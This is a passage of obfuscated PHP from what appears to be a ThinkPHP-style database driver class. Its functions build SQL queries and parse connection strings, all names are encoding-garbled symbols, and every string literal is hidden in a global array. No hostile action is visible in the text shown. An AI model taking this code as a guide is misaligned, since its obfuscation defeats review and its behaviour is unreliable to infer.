$Œ‚éàñ§ = floor(mt_rand(think_config($‰˜Ëœä[982]), count($ÚµÜáÎ’[$‰˜Ëœä[885]]) - 1)); } } } else { $Œ‚éàñ§ = floor(mt_rand(0, count($ÚµÜáÎ’[$‰˜Ëœä[885]]) - 1)); $ÃÃß÷Ÿ“ = $Œ‚éàñ§; } $Œ‚éàñ§ = $ÃÃß÷Ÿ“ !== -1 ? $ÃÃß÷Ÿ“ : $Œ‚éàñ§; $©¶÷ÍÓÄ = array($‰˜Ëœä[887] => isset($ÚµÜáÎ’[$‰˜Ëœä[887]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[887]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[887]][0], $‰˜Ëœä[888] => isset($ÚµÜáÎ’[$‰˜Ëœä[888]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[888]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[888]][0], $‰˜Ëœä[885] => isset($ÚµÜáÎ’[$‰˜Ëœä[885]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[885]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[885]][0], $‰˜Ëœä[886] => isset($ÚµÜáÎ’[$‰˜Ëœä[886]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[886]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[886]][0], $‰˜Ëœä[21] => isset($ÚµÜáÎ’[$‰˜Ëœä[21]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[21]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[21]][0], $‰˜Ëœä[915] => isset($ÚµÜáÎ’[$‰˜Ëœä[915]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[915]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[915]][0], $‰˜Ëœä[17] => isset($ÚµÜáÎ’[$‰˜Ëœä[17]][$Œ‚éàñ§]) ? $ÚµÜáÎ’[$‰˜Ëœä[17]][$Œ‚éàñ§] : $ÚµÜáÎ’[$‰˜Ëœä[17]][0]); return $this->connect($©¶÷ÍÓÄ, $Œ‚éàñ§); } public function parseDSN($ÅºæŸÌÄ) { $×·„Õø =& $_SERVER[Ó¡Ÿ§‚]; if (empty($ÅºæŸÌÄ)) { return !1; } $„°Åí¨ = parse_url($ÅºæŸÌÄ); if ($„°Åí¨[$×·„Õø[181]]) { $£¶¾®° = array($×·„Õø[960] => $„°Åí¨[$×·„Õø[181]], $×·„Õø[887] => isset($„°Åí¨[$×·„Õø[599]]) ? $„°Åí¨[$×·„Õø[599]] : $×·„Õø[12], $×·„Õø[888] => isset($„°Åí¨[$×·„Õø[984]]) ? $„°Åí¨[$×·„Õø[984]] : $×·„Õø[12], $×·„Õø[885] => isset($„°Åí¨[$×·„Õø[182]]) ? $„°Åí¨[$×·„Õø[182]] : $×·„Õø[12], $×·„Õø[886] => isset($„°Åí¨[$×·„Õø[183]]) ? $„°Åí¨[$×·„Õø[183]] : $×·„Õø[12], $×·„Õø[21] => isset($„°Åí¨[$×·„Õø[84]]) ? substr($„°Åí¨[$×·„Õø[84]], 1) : $×·„Õø[12]); } else { preg_match($×·„Õø[985], trim($ÅºæŸÌÄ), $Ë£×ˆÜµ); $£¶¾®° = array($×·„Õø[960] => $Ë£×ˆÜµ[1], $×·„Õø[887] => $Ë£×ˆÜµ[2], $×·„Õø[888] => $Ë£×ˆÜµ[3], $×·„Õø[885] => $Ë£×ˆÜµ[4], $×·„Õø[886] => $Ë£×ˆÜµ[5], $×·„Õø[21] => $Ë£×ˆÜµ[6]); } $£¶¾®°[$×·„Õø[915]] = $×·„Õø[12]; return $£¶¾®°; } protected function debug() { $Ú€‚ß–º =& $_SERVER[Ó¡Ÿ§‚]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ú€‚ß–º[986]; if (think_config($Ú€‚ß–º[987])) { think_status($Ú€‚ß–º[988]); think_trace($this->queryStr . $Ú€‚ß–º[989] . think_status($Ú€‚ß–º[24], $Ú€‚ß–º[988], 6) . $Ú€‚ß–º[990], $Ú€‚ß–º[12], $Ú€‚ß–º[991]); } } protected function parseLock($„¯Şó² = false) { $÷¡öÆ¼Â =& $_SERVER[Ó¡Ÿ§‚]; if (!$„¯Şó²) { return $÷¡öÆ¼Â[12]; } if ($÷¡öÆ¼Â[917] == $this->dbType) { return $÷¡öÆ¼Â[992]; } return $÷¡öÆ¼Â[993]; } protected function parseSet($³ˆôĞ¶í) { $‹›©âü¨ =& $_SERVER[Ó¡Ÿ§‚]; foreach ($³ˆôĞ¶í as $™ò¡ ³ => $…®‰æé„) { if (is_array($…®‰æé„) && $‹›©âü¨[297] == $…®‰æé„[0]) { $›àí´´á[] = $this->parseKey($™ò¡ ³) . $‹›©âü¨[883] . $…®‰æé„[1]; } elseif (is_scalar($…®‰æé„) || is_null($…®‰æé„)) { $›àí´´á[] = $this->parseKey($™ò¡ ³) . $‹›©âü¨[883] . $this->parseValue($…®‰æé„); } } return $‹›©âü¨[994] . implode($‹›©âü¨[50], $›àí´´á); } protected function bindParam($¡·Â›®, $ßöáÏµ) { $this->bind[$_SERVER[Ó¡Ÿ§‚][4] . $¡·Â›®] = $ßöáÏµ; } protected function parseBind($â…Öë™) { $â…Öë™ = array_merge($this->bind, $â…Öë™); $this->bind = array(); return $â…Öë™; } function parseKey(&$ä“ƒğ¸‰, $Æåìã«â = true) { if ($Æåìã«â) { $ä“ƒğ¸‰ = $this->parseKeyCheck($ä“ƒğ¸‰); } return $ä“ƒğ¸‰; } function parseKeyCheck($ØÖà×¦¥) { $ÚŒÊßĞó =& $_SERVER[Ó¡Ÿ§‚]; $ØÖà×¦¥ = trim($ØÖà×¦¥); if (!preg_match($ÚŒÊßĞó[995], $ØÖà×¦¥)) { think_exception($ÚŒÊßĞó[996] . $ØÖà×¦¥); } return $ØÖà×¦¥; } protected function parseValue($êãŸİÑ) { $‘µ¦±Ìô =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($êãŸİÑ)) { $êãŸİÑ = $‘µ¦±Ìô[956] . $this->escapeString($êãŸİÑ) . $‘µ¦±Ìô[956]; } elseif (isset($êãŸİÑ[0]) && is_string($êãŸİÑ[0]) && strtolower($êãŸİÑ[0]) == $‘µ¦±Ìô[297]) { $êãŸİÑ = $this->escapeString($êãŸİÑ[1]); } elseif (is_array($êãŸİÑ)) { $êãŸİÑ = array_map(array($this, $‘µ¦±Ìô[957]), $êãŸİÑ); } elseif (is_bool($êãŸİÑ)) { $êãŸİÑ = $êãŸİÑ ? $‘µ¦±Ìô[88] : $‘µ¦±Ìô[198]; } elseif (is_null($êãŸİÑ)) { $êãŸİÑ = $‘µ¦±Ìô[103]; } return $êãŸİÑ; } protected function parseField($¸ß¾íú) { $ÉàüõÕ¶ =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($¸ß¾íú) && strpos($¸ß¾íú, $ÉàüõÕ¶[50])) { $¸ß¾íú = explode($ÉàüõÕ¶[50], $¸ß¾íú); } if (is_array($¸ß¾íú)) { $°Ê¢ñ¥è = array(); foreach ($¸ß¾íú as $ÂÔ®ÍÜ¯ => $ú¢¤ ê…) { if (!is_numeric($ÂÔ®ÍÜ¯)) { $°Ê¢ñ¥è[] = $this->parseKey($ÂÔ®ÍÜ¯, !1) . $ÉàüõÕ¶[997] . $this->parseKey($ú¢¤ ê…); } else { $°Ê¢ñ¥è[] = $this->parseKey($ú¢¤ ê…); } } $Û˜µöÓŞ = implode($ÉàüõÕ¶[50], $°Ê¢ñ¥è); } elseif (is_string($¸ß¾íú) && !empty($¸ß¾íú)) { $Û˜µöÓŞ = $¸ß¾íú; } else { $Û˜µöÓŞ = $ÉàüõÕ¶[189]; } return $Û˜µöÓŞ; } protected function parseTable($£Åíä´Ü) { $Ş»ä€ãõ =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($£Åíä´Ü)) { $°ôç– = array(); foreach ($£Åíä´Ü as $•ëİÅ³Ñ => $¦ˆø»ãÛ) { if (!is_numeric($•ëİÅ³Ñ)) { $°ôç–[] = $this->parseKey($•ëİÅ³Ñ) . $Ş»ä€ãõ[53] . $this->parseKey($¦ˆø»ãÛ); } else { $°ôç–[] = $this->parseKey($•ëİÅ³Ñ); } } $£Åíä´Ü = $°ôç–; } elseif (is_string($£Åíä´Ü)) { if (strstr($£Åíä´Ü, $Ş»ä€ãõ[53])) { return $£Åíä´Ü; } $£Åíä´Ü = explode($Ş»ä€ãõ[50], $£Åíä´Ü); array_walk($£Åíä´Ü, array($this, $Ş»ä€ãõ[905])); } return $Ş»ä€ãõ[899] . trim(implode($Ş»ä€ãõ[998], $£Åíä´Ü), $Ş»ä€ãõ[385]) . $Ş»ä€ãõ[899]; } protected function parseWhere($ß¸†’¼¤) { $¥·†ó­ş =& $_SERVER[Ó¡Ÿ§‚]; $¡Òí’±Ø = $¥·†ó­ş[12]; if (is_string($ß¸†’¼¤)) { $¡Òí’±Ø = $ß¸†’¼¤; } else { $¸ÇƒœßÄ = isset($ß¸†’¼¤[$¥·†ó­ş[999]]) ? strtoupper($ß¸†’¼¤[$¥·†ó­ş[999]]) : $¥·†ó­ş[12]; if (in_array($¸ÇƒœßÄ, array($¥·†ó­ş[1000], $¥·†ó­ş[1001], $¥·†ó­ş[1002]))) { $¸ÇƒœßÄ = $¥·†ó­ş[53] . $¸ÇƒœßÄ . $¥·†ó­ş[53]; unset($ß¸†’¼¤[$¥·†ó­ş[999]]); } else { $¸ÇƒœßÄ = $¥·†ó­ş[1003]; } foreach ($ß¸†’¼¤ as $ÀÍà•§ò => $‡©›±å) { $¡Òí’±Ø .= $¥·†ó­ş[277]; if (is_numeric($ÀÍà•§ò)) { $ÀÍà•§ò = $¥·†ó­ş[1004]; } if (0 === strpos($ÀÍà•§ò, $¥·†ó­ş[11])) { $¡Òí’±Ø .= $this->parseThinkWhere($ÀÍà•§ò, $‡©›±å); } else { if (!preg_match($¥·†ó­ş[1005], trim($ÀÍà•§ò))) { think_exception(think_lang($¥·†ó­ş[1006]) . $¥·†ó­ş[4] . $ÀÍà•§ò); } $æ³ö©³Ã = is_array($‡©›±å) && isset($‡©›±å[$¥·†ó­ş[1007]]); $ÀÍà•§ò = trim($ÀÍà•§ò); if (strpos($ÀÍà•§ò, $¥·†ó­ş[283])) { $ı…¶¾Ø = explode($¥·†ó­ş[283], $ÀÍà•§ò); $óçÖ¡Ø– = array(); foreach ($ı…¶¾Ø as $²†Êº¹‘ => $½Âóº¨Ä) { $¼Ë­ß‹” = $æ³ö©³Ã ? $‡©›±å[$²†Êº¹‘] : $‡©›±å; $óçÖ¡Ø–[] = $¥·†ó­ş[260] . $this->parseWhereItem($this->parseKey($½Âóº¨Ä), $¼Ë­ß‹”) . $¥·†ó­ş[904]; } $¡Òí’±Ø .= implode($¥·†ó­ş[1008], $óçÖ¡Ø–); } elseif (strpos($ÀÍà•§ò, $¥·†ó­ş[284])) { $ı…¶¾Ø = explode($¥·†ó­ş[284], $ÀÍà•§ò); $óçÖ¡Ø– = array(); foreach ($ı…¶¾Ø as $²†Êº¹‘ => $½Âóº¨Ä) { $¼Ë­ß‹” = $æ³ö©³Ã ? $‡©›±å[$²†Êº¹‘] : $‡©›±å; $óçÖ¡Ø–[] = $¥·†ó­ş[260] . $this->parseWhereItem($this->parseKey($½Âóº¨Ä), $¼Ë­ß‹”) . $¥·†ó­ş[904]; } $¡Òí’±Ø .= implode($¥·†ó­ş[1003], $óçÖ¡Ø–); } else { $¡Òí’±Ø .= $this->parseWhereItem($this->parseKey($ÀÍà•§ò), $‡©›±å); } } $¡Òí’±Ø .= $¥·†ó­ş[278] . $¸ÇƒœßÄ; } $¡Òí’±Ø = substr($¡Òí’±Ø, 0, -strlen($¸ÇƒœßÄ)); } return empty($¡Òí’±Ø) ? $¥·†ó­ş[12] : $¥·†ó­ş[1009] . $¡Òí’±Ø; } protected function parseWhereItem($°¯İ¾, $íÂ§œ¼¾) { $ñú†Ğò =& $_SERVER[Ó¡Ÿ§‚]; $¥çİĞâ¹ = $ñú†Ğò[12]; if (is_array($íÂ§œ¼¾)) { if (is_string($íÂ§œ¼¾[0])) { $Œ¾şµ¥ = strtolower($íÂ§œ¼¾[0]); if (in_array($íÂ§œ¼¾[0], array($ñú†Ğò[883], $ñú†Ğò[1010], $ñú†Ğò[1011], $ñú†Ğò[1012], $ñú†Ğò[1013], $ñú†Ğò[1014]))) { $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[53] . $íÂ§œ¼¾[0] . $ñú†Ğò[53] . $this->parseValue($íÂ§œ¼¾[1]); } elseif (preg_match($ñú†Ğò[1015], $íÂ§œ¼¾[0])) { $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[53] . $this->parseValue($íÂ§œ¼¾[1]); } elseif (preg_match($ñú†Ğò[1016], $íÂ§œ¼¾[0])) { if (is_array($íÂ§œ¼¾[1])) { $¿åÒ•˜² = isset($íÂ§œ¼¾[2]) ? strtoupper($íÂ§œ¼¾[2]) : $ñú†Ğò[1001]; if (in_array($¿åÒ•˜², array($ñú†Ğò[1000], $ñú†Ğò[1001], $ñú†Ğò[1002]))) { $º·¨œİæ = array(); foreach ($íÂ§œ¼¾[1] as $·û’Ì) { $º·¨œİæ[] = $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[53] . $this->parseValue($·û’Ì); } $¥çİĞâ¹ .= $ñú†Ğò[260] . implode($ñú†Ğò[53] . $¿åÒ•˜² . $ñú†Ğò[53], $º·¨œİæ) . $ñú†Ğò[904]; } } else { $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[53] . $this->parseValue($íÂ§œ¼¾[1]); } } elseif ($ñú†Ğò[297] == $Œ¾şµ¥) { $¥çİĞâ¹ .= $ñú†Ğò[902] . $°¯İ¾ . $ñú†Ğò[53] . $íÂ§œ¼¾[1] . $ñú†Ğò[1017]; } elseif (preg_match($ñú†Ğò[1018], $íÂ§œ¼¾[0])) { $¥çİĞâ¹ .= $íÂ§œ¼¾[0]; } elseif (preg_match($ñú†Ğò[1019], $íÂ§œ¼¾[0])) { if (isset($íÂ§œ¼¾[2]) && $ñú†Ğò[297] == $íÂ§œ¼¾[2]) { $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[53] . $íÂ§œ¼¾[1]; } else { if (is_string($íÂ§œ¼¾[1])) { $íÂ§œ¼¾[1] = explode($ñú†Ğò[50], $íÂ§œ¼¾[1]); } $§öàì¿™ = implode($ñú†Ğò[50], $this->parseValue($íÂ§œ¼¾[1])); $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[902] . $§öàì¿™ . $ñú†Ğò[904]; } } elseif (preg_match($ñú†Ğò[1020], $íÂ§œ¼¾[0])) { $’·çˆ›¦ = is_string($íÂ§œ¼¾[1]) ? explode($ñú†Ğò[50], $íÂ§œ¼¾[1]) : $íÂ§œ¼¾[1]; $¥çİĞâ¹ .= $ñú†Ğò[902] . $°¯İ¾ . $ñú†Ğò[53] . $this->exp[$Œ¾şµ¥] . $ñú†Ğò[53] . $this->parseValue($’·çˆ›¦[0]) . $ñú†Ğò[1003] . $this->parseValue($’·çˆ›¦[1]) . $ñú†Ğò[278]; } else { think_exception(think_lang($ñú†Ğò[1006]) . $ñú†Ğò[4] . $íÂ§œ¼¾[0]); } } else { $¢·‘Ç«è = count($íÂ§œ¼¾); $Ë´Š¨åµ = $ñú†Ğò[12]; if (is_string($íÂ§œ¼¾[$¢·‘Ç«è - 1])) { $Ë´Š¨åµ = isset($íÂ§œ¼¾[$¢·‘Ç«è - 1]) ? strtoupper($íÂ§œ¼¾[$¢·‘Ç«è - 1]) : $ñú†Ğò[12]; if (in_array($Ë´Š¨åµ, array($ñú†Ğò[1000], $ñú†Ğò[1001], $ñú†Ğò[1002]))) { $¢·‘Ç«è = $¢·‘Ç«è - 1; } } else { $Ë´Š¨åµ = $ñú†Ğò[1000]; } for ($—ê˜äà = 0; $—ê˜äà < $¢·‘Ç«è; $—ê˜äà++) { $’·çˆ›¦ = is_array($íÂ§œ¼¾[$—ê˜äà]) ? $íÂ§œ¼¾[$—ê˜äà][1] : $íÂ§œ¼¾[$—ê˜äà]; if ($ñú†Ğò[297] == strtolower($íÂ§œ¼¾[$—ê˜äà][0])) { $¥çİĞâ¹ .= $ñú†Ğò[260] . $°¯İ¾ . $ñú†Ğò[53] . $’·çˆ›¦ . $ñú†Ğò[1017] . $Ë´Š¨åµ . $ñú†Ğò[53]; } else { $³¿ƒ†äÌ = is_array($íÂ§œ¼¾[$—ê˜äà]) ? $this->exp[strtolower($íÂ§œ¼¾[$—ê˜äà][0])] : $ñú†Ğò[883]; if (!$³¿ƒ†äÌ && is_array($íÂ§œ¼¾[$—ê˜äà]) && in_array($íÂ§œ¼¾[$—ê˜äà][0], array($ñú†Ğò[883], $ñú†Ğò[1010], $ñú†Ğò[1011], $ñú†Ğò[1012], $ñú†Ğò[1013], $ñú†Ğò[1014]))) { $³¿ƒ†äÌ = $íÂ§œ¼¾[$—ê˜äà][0]; } $¥çİĞâ¹ .= $ñú†Ğò[260] . $°¯İ¾ . $ñú†Ğò[53] . $³¿ƒ†äÌ . $ñú†Ğò[53] . $this->parseValue($’·çˆ›¦) . $ñú†Ğò[1017] . $Ë´Š¨åµ . $ñú†Ğò[53]; } } $¥çİĞâ¹ = substr($¥çİĞâ¹, 0, -4); } } else { $¥çİĞâ¹ .= $°¯İ¾ . $ñú†Ğò[1021] . $this->parseValue($íÂ§œ¼¾); } return $¥çİĞâ¹; } protected function parseThinkWhere($Å¤Ëë³‘, $•˜ÜÚÆ) { $´‚İµÌ³ =& $_SERVER[Ó¡Ÿ§‚]; $å×¤–™ = $´‚İµÌ³[12]; switch ($Å¤Ëë³‘) { case $´‚İµÌ³[352]: $å×¤–™ = $•˜ÜÚÆ; break; case $´‚İµÌ³[1004]: $å×¤–™ = is_string($•˜ÜÚÆ) ? $•˜ÜÚÆ : substr($this->parseWhere($•˜ÜÚÆ), 6); break; case $´‚İµÌ³[1022]: parse_str($•˜ÜÚÆ, $‰î°çûá); if (isset($‰î°çûá[$´‚İµÌ³[999]])) { $µà—€»³ = $´‚İµÌ³[53] . strtoupper($‰î°çûá[$´‚İµÌ³[999]]) . $´‚İµÌ³[53]; unset($‰î°çûá[$´‚İµÌ³[999]]); } else { $µà—€»³ = $´‚İµÌ³[1003]; } $‚Ïç÷ğ = array(); foreach ($‰î°çûá as $Í¥î‚†Í => $…½±¦›é) { $‚Ïç÷ğ[] = $this->parseKey($Í¥î‚†Í) . $´‚İµÌ³[1021] . $this->parseValue($…½±¦›é); } $å×¤–™ = implode($µà—€»³, $‚Ïç÷ğ); break; } return $å×¤–™; } protected function parseLimit($º¡¾°Ã) { $ËêÂÅëä =& $_SERVER[Ó¡Ÿ§‚]; return !empty($º¡¾°Ã) ? $ËêÂÅëä[51] . $º¡¾°Ã . $ËêÂÅëä[53] : $ËêÂÅëä[12]; } protected function parseJoin($ÅäÄü ) { $¸ö¨ÒØ =& $_SERVER[Ó¡Ÿ§‚]; $èß€ª• = $¸ö¨ÒØ[12]; if (!empty($ÅäÄü )) { if (is_array($ÅäÄü )) { foreach ($ÅäÄü  as $í¢›†Õ => $”¿Ü‚ÁÏ) { if (!1 !== stripos($”¿Ü‚ÁÏ, $¸ö¨ÒØ[1023])) { $èß€ª• .= $¸ö¨ÒØ[53] . $”¿Ü‚ÁÏ; } else { $èß€ª• .= $¸ö¨ÒØ[1024] . $”¿Ü‚ÁÏ; } } } else { $èß€ª• .= $¸ö¨ÒØ[1024] . $ÅäÄü ; } } $èß€ª• = preg_replace($¸ö¨ÒØ[1025], think_config($¸ö¨ÒØ[929]) . $¸ö¨ÒØ[1026], $èß€ª•); return $èß€ª•; } protected function parseOrder($¤õùœÛã) { $¢¤Š † =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($¤õùœÛã)) { $›¹Ø·ª = array(); foreach ($¤õùœÛã as $Òıúïæˆ => $µò¿Ÿ°) { if (is_numeric($Òıúïæˆ)) { $›¹Ø·ª[] = $this->parseKey($µò¿Ÿ°); } else { $µò¿Ÿ° = in_array(strtoupper(trim($µò¿Ÿ°)), array($¢¤Š †[1027], $¢¤Š †[1028])) ? $¢¤Š †[53] . $µò¿Ÿ° : $¢¤Š †[12]; if (preg_match($¢¤Š †[1029], $Òıúïæˆ)) { $›¹Ø·ª[] = $this->parseKey($Òıúïæˆ) . $µò¿Ÿ°; } else { think_exception($¢¤Š †[1030] . $Òıúïæˆ); } } } $¤õùœÛã = implode($¢¤Š †[50], $›¹Ø·ª); } return !empty($¤õùœÛã) ? $¢¤Š †[1031] . $¤õùœÛã : $¢¤Š †[12]; } protected function parseGroup($âüİ“Ú‡) { $µËÑğ” =& $_SERVER[Ó¡Ÿ§‚]; return !empty($âüİ“Ú‡) ? $µËÑğ”[1032] . $âüİ“Ú‡ : $µËÑğ”[12]; } protected function parseHaving($¡Å‹œçî) { $ÌÈÛèÌ =& $_SERVER[Ó¡Ÿ§‚]; return !empty($¡Å‹œçî) ? $ÌÈÛèÌ[1033] . $¡Å‹œçî : $ÌÈÛèÌ[12]; } protected function parseComment($Ì·‡åÔƒ) { $ÓÍ‰ÍŠ =& $_SERVER[Ó¡Ÿ§‚]; return !empty($Ì·‡åÔƒ) ? $ÓÍ‰ÍŠ[1034] . $Ì·‡åÔƒ . $ÓÍ‰ÍŠ[1035] : $ÓÍ‰ÍŠ[12]; } protected function parseDistinct($æÆØ™…) { $•ê°‘¿» =& $_SERVER[Ó¡Ÿ§‚]; return !empty($æÆØ™…) ? $•ê°‘¿»[1036] : $•ê°‘¿»[12]; } protected function parseUnion($Äóµº¼ú) { $İÖ‹À—ã =& $_SERVER[Ó¡Ÿ§‚]; if (empty($Äóµº¼ú)) { return $İÖ‹À—ã[12]; } if (isset($Äóµº¼ú[$İÖ‹À—ã[348]])) { $É—÷¹À± = $İÖ‹À—ã[1037]; unset($Äóµº¼ú[$İÖ‹À—ã[348]]); } else { $É—÷¹À± = $İÖ‹À—ã[1038]; } foreach ($Äóµº¼ú as $Éé¸üÉÏ) { $Ú…èÀĞÖ[] = $É—÷¹À± . (is_array($Éé¸üÉÏ) ? $this->buildSelectSql($Éé¸üÉÏ) : $Éé¸üÉÏ); } return implode($İÖ‹À—ã[53], $Ú…èÀĞÖ); } public function insert($ÓËÅä°°, $û¢÷ÙÄ„ = array(), $àŸÖ§’® = false) { $÷¾¼ªò  =& $_SERVER[Ó¡Ÿ§‚]; $ÆÛ†¸»» = $ã„µˆ™ğ = array(); $this->model = $û¢÷ÙÄ„[$÷¾¼ªò [281]]; foreach ($ÓËÅä°° as $–ÜüŞ¦ø => $¶ÅÆ¼š) { if (is_array($¶ÅÆ¼š) && $÷¾¼ªò [297] == $¶ÅÆ¼š[0]) { $ã„µˆ™ğ[] = $this->parseKey($–ÜüŞ¦ø); $ÆÛ†¸»»[] = $¶ÅÆ¼š[1]; } elseif (is_scalar($¶ÅÆ¼š) || is_null($¶ÅÆ¼š)) { $ã„µˆ™ğ[] = $this->parseKey($–ÜüŞ¦ø); $ÆÛ†¸»»[] = $this->parseValue($¶ÅÆ¼š); } } $éŠš‚ÙŞ = ($àŸÖ§’® ? $÷¾¼ªò [906] : $÷¾¼ªò [907]) . $÷¾¼ªò [908] . $this->parseTable($û¢÷ÙÄ„[$÷¾¼ªò [279]]) . $÷¾¼ªò [902] . implode($÷¾¼ªò [50], $ã„µˆ™ğ) . $÷¾¼ªò [903] . implode($÷¾¼ªò [50], $ÆÛ†¸»») . $÷¾¼ªò [904]; $éŠš‚ÙŞ .= $this->parseLock(isset($û¢÷ÙÄ„[$÷¾¼ªò [842]]) ? $û¢÷ÙÄ„[$÷¾¼ªò [842]] : !1); $éŠš‚ÙŞ .= $this->parseComment(!empty($û¢÷ÙÄ„[$÷¾¼ªò [354]]) ? $û¢÷ÙÄ„[$÷¾¼ªò [354]] : $÷¾¼ªò [12]); return $this->execute($éŠš‚ÙŞ, $this->parseBind(!empty($û¢÷ÙÄ„[$÷¾¼ªò [285]]) ? $û¢÷ÙÄ„[$÷¾¼ªò [285]] : array())); } public function selectInsert($‚Ü¿ ³, $²÷, $şÆ‰°ğó = array()) { $£µŠ¨ÄÂ =& $_SERVER[Ó¡Ÿ§‚]; $this->model = $şÆ‰°ğó[$£µŠ¨ÄÂ[281]]; if (is_string($‚Ü¿ ³)) { $‚Ü¿ ³ = explode($£µŠ¨ÄÂ[50], $‚Ü¿ ³); } array_walk($‚Ü¿ ³, array($this, $£µŠ¨ÄÂ[905])); $‘†ØñìÇ = $£µŠ¨ÄÂ[1039] . $this->parseTable($²÷) . $£µŠ¨ÄÂ[902] . implode($£µŠ¨ÄÂ[50], $‚Ü¿ ³) . $£µŠ¨ÄÂ[1017]; $‘†ØñìÇ .= $this->buildSelectSql($şÆ‰°ğó); return $this->execute($‘†ØñìÇ, $this->parseBind(!empty($şÆ‰°ğó[$£µŠ¨ÄÂ[285]]) ? $şÆ‰°ğó[$£µŠ¨ÄÂ[285]] : array())); } public function update($¼ÛÙÀñª, $€ÕîÈ¼Œ) { $šô˜Êì =& $_SERVER[Ó¡Ÿ§‚]; $this->model = $€ÕîÈ¼Œ[$šô˜Êì[281]]; $”Â©¿õ = $šô˜Êì[1040] . $this->parseTable($€ÕîÈ¼Œ[$šô˜Êì[279]]) . $this->parseSet($¼ÛÙÀñª) . $this->parseWhere(!empty($€ÕîÈ¼Œ[$šô˜Êì[275]]) ? $€ÕîÈ¼Œ[$šô˜Êì[275]] : $šô˜Êì[12]) . $this->parseOrder(!empty($€ÕîÈ¼Œ[$šô˜Êì[365]]) ? $€ÕîÈ¼Œ[$šô˜Êì[365]] : $šô˜Êì[12]) . $this->parseLimit(!empty($€ÕîÈ¼Œ[$šô˜Êì[292]]) ? $€ÕîÈ¼Œ[$šô˜Êì[292]] : $šô˜Êì[12]) . $this->parseLock(isset($€ÕîÈ¼Œ[$šô˜Êì[842]]) ? $€ÕîÈ¼Œ[$šô˜Êì[842]] : !1) . $this->parseComment(!empty($€ÕîÈ¼Œ[$šô˜Êì[354]]) ? $€ÕîÈ¼Œ[$šô˜Êì[354]] : $šô˜Êì[12]); return $this->execute($”Â©¿õ, $this->parseBind(!empty($€ÕîÈ¼Œ[$šô˜Êì[285]]) ? $€ÕîÈ¼Œ[$šô˜Êì[285]] : array())); } public function delete($Ò÷£„¬ = array()) { $Ğ£üĞ°Ú =& $_SERVER[Ó¡Ÿ§‚]; $this->model = $Ò÷£„¬[$Ğ£üĞ°Ú[281]]; $­À«â—Ï = $Ğ£üĞ°Ú[1041] . $this->parseTable($Ò÷£„¬[$Ğ£üĞ°Ú[279]]) . $this->parseWhere(!empty($Ò÷£„¬[$Ğ£üĞ°Ú[275]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[275]] : $Ğ£üĞ°Ú[12]) . $this->parseOrder(!empty($Ò÷£„¬[$Ğ£üĞ°Ú[365]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[365]] : $Ğ£üĞ°Ú[12]) . $this->parseLimit(!empty($Ò÷£„¬[$Ğ£üĞ°Ú[292]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[292]] : $Ğ£üĞ°Ú[12]) . $this->parseLock(isset($Ò÷£„¬[$Ğ£üĞ°Ú[842]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[842]] : !1) . $this->parseComment(!empty($Ò÷£„¬[$Ğ£üĞ°Ú[354]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[354]] : $Ğ£üĞ°Ú[12]); return $this->execute($­À«â—Ï, $this->parseBind(!empty($Ò÷£„¬[$Ğ£üĞ°Ú[285]]) ? $Ò÷£„¬[$Ğ£üĞ°Ú[285]] : array())); } public function select($·°•èò = array()) { $Ã¡šèŠò =& $_SERVER[Ó¡Ÿ§‚]; $this->model = $·°•èò[$Ã¡šèŠò[281]]; $ŠÅ¶ŸÏÂ = $this->buildSelectSql($·°•èò); $¶²——¨‚ = isset($·°•èò[$Ã¡šèŠò[349]]) ? $·°•èò[$Ã¡šèŠò[349]] : !1; if ($¶²——¨‚) { $šı½ÅöŒ = is_string($¶²——¨‚[$Ã¡šèŠò[94]]) ? $¶²——¨‚[$Ã¡šèŠò[94]] : $Ã¡šèŠò[1042] . md5($ŠÅ¶ŸÏÂ); $ÍÄˆ¢·œ = think_cache($šı½ÅöŒ, $Ã¡šèŠò[12], $¶²——¨‚); if (!1 !== $ÍÄˆ¢·œ) { return $ÍÄˆ¢·œ; } } $àÜåÔØ© = $this->query($ŠÅ¶ŸÏÂ, $this->parseBind(!empty($·°•èò[$Ã¡šèŠò[285]]) ? $·°•èò[$Ã¡šèŠò[285]] : array())); if ($¶²——¨‚ && !1 !== $àÜåÔØ©) { think_cache($šı½ÅöŒ, $àÜåÔØ©, $¶²——¨‚); } return $àÜåÔØ©; } public function buildSelectSql($ıÇá¬· = array()) { $—ƒ•Âàó =& $_SERVER[Ó¡Ÿ§‚]; if (isset($ıÇá¬·[$—ƒ•Âàó[353]])) { if (strpos($ıÇá¬·[$—ƒ•Âàó[353]], $—ƒ•Âàó[50])) { list($÷íÒ²‹ã, $°‡ßÀÎ‡) = 